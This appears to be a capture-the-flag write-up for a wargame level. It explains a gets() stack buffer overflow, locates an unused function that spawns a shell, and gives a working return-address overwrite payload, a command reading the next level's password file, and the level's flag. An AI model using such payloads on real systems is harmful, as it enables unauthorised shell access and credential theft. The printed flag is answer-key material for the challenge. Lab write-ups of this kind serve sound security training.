# Level 1

`main` just calls `gets()` into a stack buffer, then returns. `gets()` has no size limit, so a long input overflows the buffer and overwrites the saved return address.

1. There's a `run()` function main never calls, that runs `system("/bin/sh")` ([ret2function](../knowledge_base/ret2libc.md#ret2libc-vs-ret2function): point the return address at existing code instead of injecting our own):
   ```
   (gdb) info functions
   0x08048444  run
   (gdb) disas run
   call   <system@plt>    ; system("/bin/sh")
   ```

2. Find the offset (buffer is 64 bytes, `+12` for saved EBP/alignment = 76, confirm with a marker):
   ```
   (gdb) run < <(python -c "print('A' * 76 + 'BBBB')")
   0x42424242 in ?? ()
   ```
   `0x42424242` = `"BBBB"` → offset **76**.

3. Run it:
   ```
   (python -c "print('A' * 76 + '\x44\x84\x04\x08')"; cat) | ./level1
   cat /home/user/level2/.pass
   ```
   (`\x44\x84\x04\x08` is `run`'s address, `0x08048444`, little-endian. `; cat` keeps stdin open so the spawned shell doesn't get an instant EOF.)

Flag: `53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77`
